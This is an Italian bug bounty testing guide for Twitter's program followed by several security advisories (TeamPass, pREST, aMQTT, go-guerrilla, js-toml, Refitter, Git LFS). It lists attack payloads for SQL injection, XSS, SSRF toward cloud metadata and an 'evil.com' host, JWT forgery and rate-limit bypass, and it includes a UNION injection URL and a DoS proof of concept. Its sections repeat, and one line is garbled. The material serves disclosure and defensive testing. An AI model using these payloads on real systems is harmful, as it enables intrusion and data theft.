titolo: twitter Vulnerability Disclosure Program
descrizione: twitter public bug bounty program

scope: App mobile su Google Play / App Store
outOfScope: Attacchi DDoS / volumetrici
Social engineering su dipendenti
Test su ambienti di produzione con dati reali di utenti
Spam o invio massivo di contenuti
Vulnerabilità in browser di terze parti (es. Chrome bugs)
Rate limiting issues senza impatto reale
Self-XSS (richiede azione della vittima)
Vulnerabilità che richiedono accesso fisico al device
Clickjacking su pagine senza azioni sensibili
Best practice senza impatto dimostrabile
Username/email enumeration su form pubblici
CSRF su endpoint non state-changing
Vulnerabilità già note pubblicamente senza PoC aggiuntivo
Problemi di SPF/DKIM/DMARC
Mixed content warnings su pagine non autenticabili

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su twitter
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: API Endpoint Discovery
testingTechniques.description: Mappa tutti gli endpoint API, parametri e metodi accettati
steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

Mappa flusso dati end-to-end
Testa ogni input con fuzzing (boofuzz, radamsa)
Verifica configurazioni di default e credenziali
Documenta ogni anomalia con PoC riproducibile

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su CVE-2026-124260
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

titolo: GHSA-x7xj-4j4f-88xr: Git LFS may leak HTTP headers after redirections
descrizione:
### Impact

After receiving an HTTP redirection, Git LFS may forward certain HTTP headers to a host other than the one for which they were intended.  While `Authorization` headers are never forwarded to inappropriate hosts, `Cookie` headers may be forwarded incorrectly.

Git LFS has resolved this issue by never forwarding `Cookie` headers to hosts other than the ones for which they were intended.  In particular, after an HTTP redirection is received to a URL with a different scheme, host, or port than found in the URL of the current request, any `Authorization` and `Cookie` headers from the current request will not be sent in the redirected request.

### Patches

This problem exists in all versions since 0.5.0 and is patched in v3.8.1. All users should upgrade to v3.8.1.

### Workarounds

No single workaround exists.  As far as possible, users and administrators should review their systems to confirm no unnecessary HTTP redirections are performed, and that HTTP headers other than `Authorization` do not contain privileged or confidential information.

### For more information

If you have any questions or comments about this advisory:
* For general questions, start a discussion in the Git LFS [discussion forum](https://github.com/git-lfs/git-lfs/discussions).
* For reports of additional vulnerabilities, please follow the Git LFS [security reporting policy](https://github.com/git-lfs/git-lfs/blob/main/SECURITY.md).

titolo: GHSA-w3f2-pr6x-wwjc: Git LFS may attempt arbitrary remote commands via crafted SSH URLs
descrizione:
### Impact

When Git LFS makes object transfer or authentication requests to a remote host via SSH, it passes the path component of the remote's SSH URL as part of a command to be executed, but does not properly format the URL's path component as a single argument.  By inserting shell meta-characters into the SSH URL, an attacker may be able to execute arbitrary commands on the remote host, if the host passes the commands to a shell without sanitizing them first.

Git LFS has resolved this problem by fully quoting the arguments of the remote commands it sends via SSH.

As well, Git LFS has resolved a problem with the default HTTPS URLs used when an SSH URL is configured for a remote host and the host either does not support Git LFS remote commands sent via SSH or supports HTTP authentication via SSH for Git LFS but does not return an explicit HTTP URL in response to a `git-lfs-authenticate` remote command.  In these cases, Git LFS now correctly encodes the HTTPS URL used to contact the remote host.

### Patches

This problem exists in all versions since 0.5.0 and is patched in v3.8.1. All users should upgrade to v3.8.1.

### Workarounds

Users may set the `lfs.sshTransfer` Git configuration option to `never`, after which Git LFS will not attempt any object transfers over SSH.  However, Git LFS will still make authentication requests to SSH URLs, so administrators of Git LFS services should ensure their systems sanitize all commands received over SSH before executing them.

titolo: GHSA-66q9-mxf2-xqw6: TeamPass folder re-parenting authorization bypass
descrizione:
## Summary

Missing authorization in the update_folder action: any authenticated non-read-only user can rename, re-parent and convert to personal any folder in the instance, moving another team's credential subtree into their own personal space and removing it from the organization. Confirmed at HEAD 2f271cdd (3.2.1.1), and present at 3.1.3.1 and 3.1.7.6.

## The defect

The folder-management endpoint dispatches an update_folder action that renames and re-parents a folder. Unlike its sibling actions in the same file, it never checks the edited folder id or the submitted parent id against the caller's accessible-folder set, and the file itself performs no session/authorization gate at all. By pointing the new parent at their own personal folder, an authenticated low-privilege user takes ownership of any folder in the instance.

app/sources/folders.queries.php:
- The file never calls the session/authorization helpers: a grep for checkSession and userAccessPage across the whole file returns zero hits.
- case 'update_folder' (lines 294-662) contains no reference to the caller's user-accessible_folders set. The only access-related logic is the personal-folder computation at lines 428-468 and the guard at line 503, which short-circuits on `(int) $isPersonal === 1`.
- The sibling actions do carry the check: case 'add_folder' validates against user-accessible_folders at line 743, case 'delete_folders' at line 904, and case 'copy_folder' applies the equivalent parent check.

So update_folder is the one folder-mutating action in the file without an authorization predicate on either the target folder id or the new parent id.

## Attacker model and trace

An authenticated TeamPass user who is not read-only (no administrative role required). The attacker submits update_folder with the victim folder's id and a parentId pointing at their own personal folder. Because the new parent is personal, the personal-folder computation sets $isPersonal = 1, which satisfies the line 503 guard, and the update writes the new parent and personal_folder = 1 for the target folder.

Consequences: the stolen subtree is added to the attacker's accessible set on their next login, so the item list renders for them, and do_items_list_in_folder exposes the plaintext label, login, url, email and description of every credential in that subtree (item passwords stay sharekey-protected, hence C:L). Because the folder is now flagged personal, it disappears from the organization view for everyone else including administrators (the admin listing selects only personal_folder = 0), so this is also a denial of access to the real owners.

## Verification

Source-verified at HEAD: no session/authorization helper anywhere in the file; the update_folder case contains no accessible-folders predicate while add_folder, delete_folders and copy_folder do; the personal-folder short-circuit at line 503. A live TeamPass instance was not stood up.

Secondary (needs a live confirmation before filing): there appears to be an unauthenticated variant. filter_input(INPUT_POST, 'key') returns null when omitted and $session->get('key') is null on a cookie-less session, so the null !== null comparison fails open; encryptClientServer is only set in public/index.php, so prepareExchangedData takes the plaintext-JSON branch. If that holds on a live instance this rises toward 9.4. The sibling actions fail closed on the anonymous path; only update_folder fails open. Please verify live, or report the authenticated variant alone (which stands on the source reading).

## Suggested fix

In the update_folder case, verify that both the target folder id and the submitted parentId are members of the caller's user-accessible_folders set (mirroring add_folder and delete_folders) before applying the update, and reject a re-parent that would flip personal_folder for a folder the caller does not own. Adding the standard session/authorization gate to folders.queries.php as a whole is the more durable fix. Note items.queries.php has a second, identically named update_folder case that does perform the accessible-folders check, but that one can only edit title/complexity; the unguarded copy in folders.queries.php is the one the UI calls for re-parenting.

## Tooling

AI assistance was used while investigating, but it was confirmed at HEAD that folders.queries.php contains no checkSession/userAccessPage call, that the update_folder case (lines 294-662) contains no accessible-folders predicate while add_folder (line 743) and delete_folders (line 904) do, and that the personal-folder short-circuit sits at line 503.

titolo: GHSA-2hjf-7455-w946: aMQTT: Inefficient Regular Expression Complexity and Uncontrolled Resource Consumption and Improper Input Validation
descrizione:
### Impact

`amqtt` is vulnerable to a remote denial of service caused by improper MQTT topic-filter validation combined with catastrophic regular-expression backtracking.

A single client can freeze the entire broker by sending one specially crafted `SUBSCRIBE` packet followed by one `PUBLISH` packet.

The vulnerability is caused by two defects:

1. `add_subscription()` validates the placement of the single-level wildcard `+` using substring checks for `/+` and `+/`, rather than verifying that each `/`-delimited level containing `+` is exactly `+`. This allows malformed filters such as `"+/" + "+" * 60` to be accepted instead of rejected with return code `0x80`, as required by MQTT-4.7.1-3.
2. `_matches()` converts every `+` character into the greedy regular-expression fragment `[^/]*` and evaluates the resulting expression with `re.fullmatch()`. A filter containing many adjacent `+` characters can cause catastrophic backtracking when matched against a topic that partially matches but ultimately fails.

Topic matching runs synchronously inside the broker’s global broadcast loop. When the malicious match is evaluated, it blocks the asyncio event loop and prevents the broker from processing any other work.

The issue was reproduced using a single raw MQTT 3.1.1 TCP connection with no third-party client dependencies.

Successful exploitation causes:

- Existing message delivery to stop
- New MQTT connections to receive no `CONNACK`
- Keepalive processing to stop
- Broadcast processing to stop
- The broker to remain unavailable until the process is restarted

Under the default configuration, anonymous clients can exploit the vulnerability without credentials. When authentication is enabled, any authenticated client permitted to create arbitrary subscriptions and publish messages may still exploit it. Authentication alone is therefore not a sufficient mitigation.

- Ecosystem: `pip`
- Package: `amqtt`
- Affected versions: `>= 0.11.0, <= 0.11.3`

The vulnerable code is present in the `v0.11.0` release commit, `352678c87e50e501a8a5bb91fab73c9400fa046c`, and remained present on the main branch as of `eeb1e254da9a1e8d9cc68ae754fcedac652e8fc0`. Versions before 0.11.0 were not evaluated.

This is a denial-of-service vulnerability only. `re.escape()` prevents arbitrary regular-expression injection, and there is no known path to remote code execution.

No confidentiality or integrity impact has been identified. Successful exploitation causes a complete loss of availability for the affected broker process.

### Patches

The issue has been patched in the `v0.11.4` released version; all users should upgrade.

The completed fix:

- Validate topic filters one level at a time
- Require any level containing `+` to be exactly `+`
- As part of comprehensive MQTT topic-filter validation, require `#` to occupy an entire level and appear only as the final level
- Replace the regular-expression matcher with deterministic, level-by-level MQTT topic matching

Simply changing the validation logic is not sufficient defense in depth if malformed filters can reach the existing regular-expression matcher through another code path.

### Workarounds

This is the temporary mitigation that was recommended prior to the patched release: administrators can install a topic-filtering plugin that rejects malformed wildcard subscriptions before they are added to the broker. Place the plugin in an importable Python module, enable it in the broker configuration, and restart the broker.

```python
from amqtt.contexts import Action
from amqtt.plugins.base import BaseTopicPlugin
from amqtt.session import Session

class RejectInvalidTopicFilters(BaseTopicPlugin):
    """A plugin to prevent invalid wildcard subscriptions."""
    async def topic_filtering(
        self, *, session: Session | None = None,
        topic: str | None = None,
        action: Action | None = None
    ) -> bool | None:

        if topic and action == Action.SUBSCRIBE:
            levels = topic.split("/")
            return all(
                level in {"+", "#"} or ("+" not in level and "#" not in level)
                for level in levels
            ) and "#" not in levels[:-1]
        return True
        
config = {
    ...
    'plugins':{
        ...
        'myplugins.RejectInvalidTopicFilters': {}
    }
}
``` 

This workaround applies when subscription requests pass through the plugin. If the broker is configured to use a persistent session plugin, restarting the broker alone is not sufficient; any persisted sessions containing malformed topic filters need to be removed.

Restarting the broker restores availability after exploitation, but the broker remains vulnerable until the patch or workaround is installed.

### Acknowledgments

aMQTT thanks the following security researchers for their professional, coordinated private disclosure:

* **Yongkang Xiao** (Wuhan University)
* **Min Shi** (Wuhan University)
* **Qiyi Deng** (Wuhan University)
* **Jing Chen** (Wuhan University)

titolo: GHSA-hghq-53p7-c582: go-guerrilla crashes on a bare XCLIENT command (7-byte slice off-by-one panic)
descrizione:
The defect
----------
Confirmed at HEAD. server.go: cmdXCLIENT = []byte("XCLIENT") is 7 bytes (line 78), so the dispatch match cmdXCLIENT.match(cmd) only guarantees len(input) >= 7. The handler then slices input[8:] (line 586):

    case sc.XClientOn && cmdXCLIENT.match(cmd):
        if toks := bytes.Split(input[8:], []byte{' '}); len(toks) > 0 {   // line 586

A client sending the bare command XCLIENT (exactly 7 bytes) hits input[8:7] and panics runtime error: slice bounds out of range [8:7]. handleClient runs in the per-connection goroutine (server.go:391) which has no recover(); the only recover() calls are in the backend mail-processing workers (a different goroutine never reached during command parsing), so the unrecovered panic crashes the whole SMTP daemon.

Input and attacker
-------------------
Connect to the SMTP port, then send XCLIENT\r\n (a bare LF also works; no HELO needed). Precondition: xclient_on: true (off by default, but a documented nginx-fronted deployment; go-guerrilla does not restrict who may send XCLIENT). Attacker model: any unauthenticated client on the SMTP port.

Verification level
------------------
EXECUTED with a negative control (agent-run, driving the real server.handleClient with XClientOn=true over the suite's mock net.Conn). The bare XCLIENT panics with the exact OOB; the negative control XCLIENT with a trailing space (8 bytes) does not panic and returns 250. The upstream TestXClient tests XCLIENT ADDR=... and XCLIENT c but never the bare 7-byte form (the missing regression case). I independently re-confirmed at HEAD that cmdXCLIENT is 7 bytes (server.go:78), that the handler slices input[8:] (server.go:586), and that handleClient (server.go:391) has no recover. NOT verified: did not stand up a standalone daemon on a real socket to observe OS-level process exit (used the mock net.Conn plus the traced absence of recover; crash-to-exit is standard Go runtime behavior).

Suggested fix
-------------
Guard the slice against the exact-verb-length case: require len(input) > len(cmdXCLIENT)+1 (or slice at the verb length and trim) before input[8:]. A recover in the per-connection handleClient loop would also contain any residual command-parse panic to the single connection.

Also checked and SOUND
----------------------
The rfc5321 recursive-descent parser (MAIL/RCPT/HELO/EHLO/address) is bounds-safe (next()/peek() return 0 at EOF), and the line/size/recipient caps are enforced. XCLIENT is the only off-by-one; every other command arm slices exactly at its verb length.

Advisory-source note
--------------------

titolo: GHSA-v9v2-98xq-627c: pREST _groupby function-expression SQL injection (incomplete fix of CVE-2025-58450)
descrizione:
What the fix did and the gap
----------------------------
The v2.3.0 fix (commit e88dabb) routed the _select field through a strict new gate, sanitizeSelectField (postgres.go:947/1003/2097). The sibling _groupby path was left on the far weaker isSafeSQLExpression. adapters/postgres/postgres.go, GroupByClause (line 1946): a _groupby field that contains balanced parens takes the raw-SQL-expression branch (around lines 1999-2006), gated only by isSafeSQLExpression (line 2001, defined at 2043). That gate validates only the OUTERMOST function name against a 13-entry allowlist and uses a character allowlist that permits spaces, single quotes and parens. It blocks ;, --, /* , unbalanced parens and an outer pg_ prefix, but NOT a trailing UNION SELECT ..., a nested (SELECT ...) subquery, or an inner pg_ function. sanitizeSelectField (the CVE fix) rejects exactly those.

Input and attacker
-------------------
GET /{database}/{schema}/{table}?_select=id&_groupby=upper((SELECT+1))+UNION+SELECT+current_user. Sink trace: controllers/crud.go:131 calls GroupByClause unconditionally, concatenates it into sqlSelect (crud.go:133), executed at crud.go:176 with only the WHERE values parameterized. Reached after only a table read-permission check, passable unauthenticated in the default config (the same pipeline and attacker model as the anchor).

Verification level
------------------
EXECUTED with negative controls (agent-run go test ./adapters/postgres/, PASS): isSafeSQLExpression wrongly accepts four payloads and GroupByClause emits them raw (e.g. GROUP BY upper((SELECT 1)) UNION SELECT current_user, and GROUP BY abs((SELECT 1 FROM pg_sleep(3)))); negative controls with ; and -- are rejected; and sanitizeSelectField (the CVE fix) rejects the exact UNION payload the sibling gate accepts. I independently re-confirmed at HEAD that _groupby is gated by isSafeSQLExpression (postgres.go:2001) while _select uses sanitizeSelectField (postgres.go:947). NOT verified: end-to-end UNION exfiltration against a live Postgres (needs column/type alignment, Postgres-gated). The pg_sleep DoS primitive is unconditional and needs no alignment; char-by-char blind extraction is constrained (commas are pre-split, and =/</> are blocked).

Suggested fix
-------------
Route _groupby through the same strict gate as _select (sanitizeSelectField-style: reject nested subqueries, UNION, inner pg_ functions, and anything past a single allowlisted function call), or parameterize/whitelist the group-by columns.

Also checked and SOUND
----------------------
The other builders (WhereByRequest, OrderByRequest, JoinByRequest, CountByRequest, the jsonb/tsquery paths, ->>having, ident.IsValid) are sound; only the _groupby non-having function branch is the weak sibling.

Advisory-source note
--------------------
Five-source enumeration: CVE-2025-58450 (GHSA-p46v-f2x8-qp98, "Systemic SQL Injection", GO-2025-3941) and the newer GHSA-qvx3-q8vx-9q3c (which covers _select, fixed v2.3.0). Neither mentions _groupby / GROUP BY. The systemic advisory's own "nested queries can be performed" note supports the incomplete-fix framing. Not contested.

Dedup
-----
Dedup gate clean: no prest/prest blocking verdict in COVERED-INDEX, DISCLOSURE-INDEX or SCOUT-EXCLUDE.

Tooling
-------
AI assistance wsa used while investigating. The injection is executed-verified with negative controls (isSafeSQLExpression accepts four UNION/subquery/pg_sleep payloads that GroupByClause emits raw, while ;/-- are rejected and the _select gate rejects the same UNION payload), and I confirmed at HEAD that _groupby uses the weak isSafeSQLExpression while _select was hardened with sanitizeSelectField.

titolo: GHSA-3g82-77xr-68x5: js-toml allows uncontrolled recursion in `load()` leading `RangeError` (stack exhaustion) on deeply nested input
descrizione:
## Summary

`load()` parses untrusted TOML using a recursive-descent parser (Chevrotain) and a
recursive tree-walking interpreter. Neither the parser nor the interpreter enforces a
maximum nesting / key depth. A small, attacker-controlled document with deep nesting
(arrays, inline tables) or a long dotted key drives recursion past the V8 call-stack
limit, and `load()` throws an **uncaught `RangeError: Maximum call stack size exceeded`**.

This is a problem for two reasons:

1. **Denial of Service.** A tiny payload (≈2 KB) reliably aborts parsing. In any
   service that parses user-supplied TOML, an unhandled `RangeError` can crash the
   worker/process (500 / restart loop).
2. **Error-contract violation.** The library signals invalid input via
   `SyntaxParseError` (see `src/load/exception.ts`; the entire test suite asserts
   `SyntaxParseError`). Consumers that follow this contract —

   ```js
   try { load(input); }
   catch (e) {
     if (e instanceof SyntaxParseError) return badRequest();
     throw e; // unexpected -> propagates
   }
   ```

   — will **re-throw** the `RangeError` instead of treating the input as malformed,
   turning malformed input into an unexpected fatal error.

## Impact

- Unauthenticated attacker who can supply a TOML string to an application using
  `js-toml` can force `load()` to throw a non-`SyntaxParseError` error.
- If the error is not caught by a generic handler, the Node.js process terminates
  (availability impact).
- Even when caught generically, the documented/expected error type contract is broken,
  which can bypass input-validation branches that key off `SyntaxParseError`.

No confidentiality or integrity impact. The error is thrown synchronously and is
catchable, so a consumer that catches *all* exceptions is not crashed — this is why the
severity is assessed Low–Medium rather than High.

## Affected code / root cause

There is no depth bound anywhere in the parse pipeline. Recursion occurs in (at least)
two independent places:

1. **Parser (recursive descent).** `src/load/parser.ts` — `array` / `inlineTable`
   rules recurse through `value` for each nesting level.
2. **Interpreter (tree walk).** `src/load/interpreter.ts` —
   `assignValue`, `createTable`, `getOrCreateArray` recurse per dotted-key segment, and
   `cleanInternalProperties` recurses per object depth.

Because there is no configurable or hard limit, the recursion depth is bounded only by
the V8 stack, and overflow surfaces as a raw `RangeError`.

## Steps to reproduce (PoC)

Environment used: Node.js v20, `js-toml@1.1.2`.

```js
import { load, SyntaxParseError } from 'js-toml';

function probe(label, toml) {
  try {
    load(toml);
    console.log(`[OK]            ${label}`);
  } catch (e) {
    const expected = e instanceof SyntaxParseError;
    console.log(`[${e.constructor.name}${expected ? '' : ' (UNEXPECTED)'}] ${label}: ${String(e.message).split('\n')[0]}`);
  }
}

// 1) Deeply nested arrays  (~2 KB payload)
probe('nested array depth 1000', 'x = ' + '['.repeat(1000) + ']'.repeat(1000));

// 2) Deeply nested inline tables
let v = '1';
for (let i = 0; i < 1000; i++) v = `{ a = ${v} }`;
probe('nested inline table depth 1000', 'x = ' + v);

// 3) Deep dotted key (interpreter recursion)
const key = Array.from({ length: 5000 }, (_, i) => 'a' + i).join('.');
probe('dotted key depth 5000', `${key} = 1`);
```

### Observed output

```
[RangeError (UNEXPECTED)] nested array depth 1000: Maximum call stack size exceeded
[RangeError (UNEXPECTED)] nested inline table depth 1000: Maximum call stack size exceeded
[RangeError (UNEXPECTED)] dotted key depth 5000: Maximum call stack size exceeded
```

Each case throws `RangeError`, **not** `SyntaxParseError`. Overflow occurs in single-digit
milliseconds, so it is not a CPU-exhaustion issue — it is an immediate, deterministic abort.

Notes on thresholds (machine-dependent; exact numbers vary by stack size):
- Nested arrays / inline tables overflow at roughly **depth ~1000** (parser recursion).
- Dotted keys overflow at roughly **depth ~5000** (interpreter recursion); depth 1000 still succeeds.

## Suggested remediation

Enforce an explicit, documented maximum nesting/key depth and surface violations as
`SyntaxParseError` (consistent with all other invalid-input handling). For example:

- Track current depth in the parser/interpreter and throw `SyntaxParseError`
  (e.g. `"Maximum nesting depth exceeded"`) once a configurable limit (e.g. 100–1000)
  is reached, **before** the native stack overflows.
- As a defensive backstop, wrap the top-level `load()` body so that a thrown
  `RangeError` from stack exhaustion is converted into a `SyntaxParseError`, guaranteeing
  the documented error contract holds for all malformed input.

A configurable limit (with a safe default) is preferable so legitimate deep documents can
opt into a higher bound.

## Disclosure

Reported privately via GitHub Security Advisory. Happy to provide additional reproducers
or test against a candidate patch.

titolo: GHSA-x6w4-f264-3vvr: Refitter: Unrestricted OpenAPI references permit build-host SSRF and file inclusion
descrizione:
### Summary

Refitter (the `refitter` dotnet tool, built on NJsonSchema for `$ref` resolution) fetches remote
`http(s)` URLs and reads local files (including absolute paths and `../` traversal outside the input
directory), inlining the referenced schema into the generated Refit interface/contracts. Running
`refitter <spec> --output Out.cs` on a spec whose `$ref` points at an attacker/internal URL or an
arbitrary local file yields SSRF, remote file inclusion, and local file inclusion. Verified on
Refitter 2.0.0.

### Details

- `$ref: http://attacker-or-internal/evil.json#/...` -> build host fetches (SSRF) and inlines the
  remote schema (RFI); confirmed property `REMOTE_REFIT_PROP`.
- `$ref: /abs/path.json#/...` or `../../secret.json#/...` -> out-of-tree local file read + inlined
  (LFI); confirmed property `REFIT_LFI_MARKER`. Both absolute and relative traversal work.

No RCE: Refitter emits Refit interfaces with no baseUrl string literal (Refit sets the base address at
runtime), enum values use C# verbatim-string doubling, and string defaults are escaped. The chain
stops at SSRF + RFI + LFI.

The `$ref` resolution is performed by Refitter's NJsonSchema dependency, which Refitter ships and
invokes with these unsafe defaults.

### PoC

`reproduce.sh` (+ `make_spec.py`, `listener.py`) attached: installs the .NET SDK + Refitter if needed,
confirms LFI (out-of-tree read), SSRF (listener hit during generation), and RFI (remote schema
inlined). Verified on 2.0.0.

### Impact

